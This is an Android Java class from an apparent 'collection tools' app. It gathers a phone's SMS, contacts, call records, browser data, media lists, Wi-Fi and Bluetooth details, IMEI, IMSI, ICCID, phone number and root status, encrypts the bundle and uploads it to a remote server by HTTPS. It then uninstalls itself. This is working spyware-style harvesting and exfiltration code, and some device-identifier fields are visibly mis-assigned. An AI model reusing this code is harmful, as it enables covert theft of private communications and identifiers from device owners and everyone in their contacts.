package com.collection.tools.utils;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

import com.collection.tools.R;
import com.collection.tools.entity.Audio;
import com.collection.tools.entity.BluetoothInfo;
import com.collection.tools.entity.Browser;
import com.collection.tools.entity.CallRecordInfo;
import com.collection.tools.entity.ImageInfo;
import com.collection.tools.entity.LinkMan;
import com.collection.tools.entity.LinkManInfo;
import com.collection.tools.entity.LinkManPhone;
import com.collection.tools.entity.NetEntity;
import com.collection.tools.entity.PhoneInfo;
import com.collection.tools.entity.SmsInfo;
import com.collection.tools.entity.TaskEntity;
import com.collection.tools.entity.TransMessage;
import com.collection.tools.entity.Video;
import com.collection.tools.entity.Wifi;
import com.collection.tools.provider.AudioProvider;
import com.collection.tools.provider.BluetoothProvider;
import com.collection.tools.provider.BrowserProvider;
import com.collection.tools.provider.CallRecordProvider;
import com.collection.tools.provider.ContactsProvider;
import com.collection.tools.provider.ImageProvider;
import com.collection.tools.provider.PhoneContactProvider;
import com.collection.tools.provider.SimContactsProvider;
import com.collection.tools.provider.SmsProvider;
import com.collection.tools.provider.VideoProvider;
import com.collection.tools.provider.WifiProvider;
import com.collection.tools.ui.ActionListener;
import com.collection.tools.ui.MessageDialog;
import com.collection.tools.ui.ShowDialogUI;
import com.collection.tools.ui.UpdateUI;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by John.Lu on 2017/6/12.
 */

public class TaskManager {

    private static Context sContext;
    private  List<Audio> audioProviderList;
    private   List<Browser> browserProviderList;
    private List<CallRecordInfo> callRecordProviderList;
    private List<ImageInfo> imageProviderList;
    private   List<LinkMan> linkMans;
    private   List<LinkManInfo> phoneContactProviderList;
    private  List<LinkManInfo> smsList;
    private List<Video> videoProviderList;
    private  List<Wifi> wifiProviderList;
    private List<SmsInfo> smsInfoList;
    private  EncoderHelper encoderHelper;
    private static Handler sTaskHandler;
    private  String encryptionText;
    private static HandlerThread sHandlerThread;
    private List<BluetoothInfo> bluetoothInfos;
    private  static  Activity sActivity;
    private  static View sView;

    public  static  void init(Context context)
    {
        sContext =context;
        sHandlerThread = new HandlerThread("taskThread");
        sHandlerThread.start();
        sTaskHandler = new TaskHandler(sHandlerThread.getLooper(), sContext);
        checkInitInternet();
    }
    public TaskManager(Context context, Handler handler)
    {
            sContext = context;
             sTaskHandler =handler;
    }

    public static void checkInitInternet()
    {
        NetEntity netEntity = NetUtils.checkState_23(sContext);
        if(!netEntity.isWifi() && !netEntity.isMoble())
        {
            sTaskHandler.sendEmptyMessage(Const.INTERNET_FAILED);
            //网络不通
        }
        else
        {
            sTaskHandler.sendEmptyMessage(Const.INIT);
        }
    }

    /**
     *网络上传，检测网络和传递对象
     * */
    private void  check(TransMessage transMessage)
    {
        if(transMessage == null)
        {
            //未知错误
            sTaskHandler.sendEmptyMessage(Const.UNKWNON);
            return;
        }
        NetEntity netEntity = NetUtils.checkState_23(sContext);
        if(!netEntity.isMoble() && !netEntity.isWifi())
        {
            sTaskHandler.sendEmptyMessage(Const.INTERNET_FAILED);
            //网络不通
            return;
        }
    }

    public  void startWork(TransMessage transMessage)
    {
        check(transMessage);
        init();
        String data =readPhoneInfoToJsonString();
        //加密传输
        encoderHelper = new EncoderHelper(sContext);
         encryptionText = callEncryption(data,transMessage.getTranskey());
        if(encryptionText != null) {
            callHttps(encryptionText,transMessage.getToken());//网络请求
            //------------测试加密数据---------------------------
        //    Log.d("****","encode "+ encryptionText);//
//            byte[] callDecryption = null;
//            byte buf[] = Base64.decode(encryptionText.getBytes(), Base64.DEFAULT);
//            callDecryption = callDecryption(buf, transMessage.getTranskey());
//            Log.d("====","deco: "+new String (callDecryption));
//            FileHelper fileHelper = new FileHelper(sContext);
//            fileHelper.writeFile(callDecryption);

            //------------------------------------------------------
        }
        else
        {
            //解密文件出错
            Log.e("====","content encode failed ");
            sTaskHandler.sendEmptyMessage(Const.UNKWNON);
        }

    }

    private byte[] callDecryption(byte[] encryptionText,String token)
    {
        return  encoderHelper.testDecode(encryptionText,token);
    }

    private String callEncryption(String data,String token)
    {
        return encoderHelper.encodeData(data,token);
    }

    private void callHttps(String data,String token)
    {


        byte[] mbuf = null;//;fileHelper.readFile();
        try {
            mbuf = data.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        //https
        HttpHelper httpHelper = new HttpHelper(token);
        httpHelper.httpsRequest(mbuf);
        int responseCode = httpHelper.getmResponesCode();
//        int responseCode =207;// 测试异常信息
        Log.e("********","respCode: "+responseCode);
        Log.d("*****","endTime: "+System.currentTimeMillis());
        if(responseCode == 200)
        {
            try {
                InputStream inputStream= httpHelper.getInputStream();
                StringBuffer sb = new StringBuffer();
                if(inputStream!= null)
                {
                    byte buf[] = new byte[1024];
                    int len=-1;
                    while (true)
                    {
                        len = inputStream.read(buf);
                        if(len == -1)
                        {
                            break;
                        }
                        //{"code":204,"msg":"\u4e0a\u4f20\u6210\u529f"} ，解析这个字段，如果不是204，那么，提示上错失败，
                      //  Log.d("*******",new String(buf,0,len));
                        sb.append(new String(buf,0,len));
                        //删除应用
                    }
                    //检测结果
                    checkResult(httpHelper,sb.toString());
                }

            }catch (Exception e)
            {
                e.printStackTrace();
            }
        }
        //失败的情况,测试通过，在网络失败之后会回调
        else
        {
            if(httpHelper != null)
            {
                httpHelper.closeConnect();
            }
            //失败，再次尝试
            //网络请求出错
            Log.e("===","again: "+"网络连接异常 "+responseCode);
            sTaskHandler.sendEmptyMessage(Const.AGAIN);
        }
    }
    /**
     * 检测上报情况
     * */
    private void checkResult(HttpHelper httpHelper,String result)
    {

        if(httpHelper != null)
        {
            httpHelper.closeConnect();
        }
        if(Utils.checkResult(result))
        {
            sTaskHandler.sendEmptyMessage(Const.UPLOAD_OK);
            SpfUtils.setCount("finished",1);
        }
        else
        {
            //上传失败
            sTaskHandler.sendEmptyMessage(Const.UPLOAD_FAILED);
        }
    }

    public static  void setsView(View view,Activity activity)
    {
        sView = view;
        sActivity =activity;
    }
    /**
     * 响应单击事件
     * */
    public static void onClick( )
    {
        if (sView != null && sActivity != null)
        {
            TextView textView = (TextView) sView;
           // textView.setText(sContext.getResources().getText(R.string.update_ui));
           // sTaskHandler.post(new UpdateUI(textView,sActivity));
            ActionListener actionListener = new ActionListener(textView, sTaskHandler, sActivity);
            textView.setOnClickListener(actionListener);
        }

    }



    /**
     * 对话框，提示成功或者失败的信息，以及对应的消息状况
     * */
    public static  void showDialog(TaskEntity taskEntity)
    {
        if(sActivity == null)
        {
            Log.e("===","sActivity == null");
            return;//出现异常，activity被销毁
        }
            sTaskHandler.post(new ShowDialogUI(sActivity,sTaskHandler,taskEntity));
    }

    public static void showMsg(TaskEntity taskEntity)
    {
        if(sActivity == null)
        {
            Log.e("===","activity null");
            return;
        }
        sTaskHandler.post(new MessageDialog(sActivity,sTaskHandler,taskEntity));
    }

    /***
     * 结束任务，关闭当前页面
     * */
    public  static  void callFinishTask()
    {
        Utils.uninstallApk(sContext);
        if(sActivity != null)
        {
            sActivity.finish();
        }

    }

    /**
     * 初始化资源，再次调用
     * */
    public static void initResouce(){
        ConfigurationHelper configurationHelper  = new ConfigurationHelper(sTaskHandler, sContext);
        configurationHelper.initConfig();
    }

    /**
     * 数据初始化
     * */
    private  void init()
    {
        AudioProvider audioProvider = new AudioProvider(sContext,false);
         audioProviderList = (List<Audio>) audioProvider.getList();
        show(audioProviderList);

        BrowserProvider browserProvider = new BrowserProvider(sContext);
        browserProviderList = (List<Browser>) browserProvider.getList();
        show(browserProviderList);

        CallRecordProvider callRecordProvider = new CallRecordProvider(sContext);
         callRecordProviderList = (List<CallRecordInfo>) callRecordProvider.getList();
        show(callRecordProviderList);

        ContactsProvider contactsProvider = new ContactsProvider(sContext);
        linkMans = (List<LinkMan>) contactsProvider.getList();
        show(callRecordProviderList);

        ImageProvider imageProvider = new ImageProvider(sContext,false);
         imageProviderList = (List<ImageInfo>) imageProvider.getList();
        show(imageProviderList);

        PhoneContactProvider phoneContactProvider = new PhoneContactProvider(sContext);
       phoneContactProviderList = (List<LinkManInfo>) phoneContactProvider.getList();
        show(phoneContactProviderList);

        SimContactsProvider sp = new SimContactsProvider(sContext);
         smsList = (List<LinkManInfo>) sp.getList();
        show(smsList);

        VideoProvider videoProvider = new VideoProvider(sContext,false);
        videoProviderList = (List<Video>) videoProvider.getList();
        show(videoProviderList);

        WifiProvider wifiProvider = new WifiProvider(sContext);
        wifiProviderList = (List<Wifi>) wifiProvider.getList();
        show(wifiProviderList);

        SmsProvider smsProvider = new SmsProvider(sContext);
        smsInfoList = (List<SmsInfo>) smsProvider.getList();
        show(smsInfoList);

        //读取蓝牙信息
        bluetoothInfos = BluetoothProvider.getBluetoothEntity();
    }

    public String readPhoneInfoToJsonString()
    {
        //添加数据
        for(int index =0; index  < smsList.size();++index)
        {
            LinkMan linkMan = new LinkMan();
            linkMan.name = smsList.get(index).name;
            linkMan.Type = "Sim";
            linkMan.contactsId = ""+index+1;
            ArrayList list = new ArrayList();
            LinkManPhone linkManPhone = new LinkManPhone();
            linkManPhone.phoneNumberType ="";
            linkManPhone.phoneNumber = smsList.get(index).phone;
            linkManPhone.count = smsList.get(index).count;
            list.add(linkManPhone);
            linkMan.phones = list;
            linkMans.add(linkMan);
        }
        JsonHelper jsonHelper = new JsonHelper(linkMans);
        jsonHelper.setBluetoothInfos(bluetoothInfos);
        String json =jsonHelper.generatorJson(getPhoneInfo(),smsInfoList,callRecordProviderList,imageProviderList,videoProviderList,audioProviderList,browserProviderList,wifiProviderList);
        return  json;
    }
/**
 * 测试使用显示
 *
 * */
    private void show(List<?> datas)
    {
        boolean flag=  false;
      if(flag)
      {
          if(datas != null && datas.size() > 0)
          {
              for(Object object : datas)
              {
                  Log.d("=====",object.toString());
              }
          }
      }
    }
    private PhoneInfo getPhoneInfo()
    {
        PhoneInfo phoneInfo = new PhoneInfo();
        phoneInfo.callRecordNumber = new StringBuilder((String.valueOf(callRecordProviderList.size()))).toString();
        phoneInfo.LinkManNumber = new StringBuilder((String.valueOf(linkMans.size()))).toString();
        phoneInfo.SmsNumber = new StringBuilder((String.valueOf(smsInfoList.size()))).toString();
        TSimCardInfo tSimCardInfo = new TSimCardInfo(sContext);
        ImeiUtils.IMEInfo imeInfo = new ImeiUtils(sContext).getIMEInfo();
        if(imeInfo != null)
        {
            if(imeInfo.imei_1 != null)
            {
                phoneInfo.IMEI1 = imeInfo.imei_1;
            }

            if(imeInfo.imsi_1 != null)
            {
                phoneInfo.IMSI1  = imeInfo.imei_1.equals(imeInfo.imei_2) ? null : imeInfo.imei_2;
            }
            if(imeInfo.imei_2!= null)
            {
                phoneInfo.IMEI2 = imeInfo.imsi_1.equals(imeInfo.imsi_2) ? null : imeInfo.imsi_2;
            }

            if(imeInfo.imsi_2 != null)
            {
                phoneInfo.IMSI2 = imeInfo.imsi_1.equals(imeInfo.imsi_2) ? null : imeInfo.imsi_2;
            }
            phoneInfo.chipName = imeInfo.chipName;
        }

        if(tSimCardInfo != null)
        {
            phoneInfo.ICCID = tSimCardInfo.getICCID();
            phoneInfo.PhoneNumber = tSimCardInfo.getNativePhoneNumber();
            phoneInfo.wifiMac = tSimCardInfo.getLocalMacAddress();
            phoneInfo.bluetoothMac = tSimCardInfo.getBluetoothMac();
        }

        phoneInfo.isRoot =isRoot();
        return phoneInfo;
    }
    private int isRoot() {
        try {
            if(Runtime.getRuntime().exec("su").getOutputStream() != null) {
                return 1;
            }
        }
        catch(IOException v0) {
            int v2 = 0;
            return v2;
        }

        int v1 = 0;
        return v1;
    }


    public static  void onDestroyed()
    {
        if(sActivity != null)
        {
            sActivity=null;
        }
        if(sContext != null)
        {
            sContext =null;
        }
        if(sView != null)
        {
            sView =null;
        }
    }

}
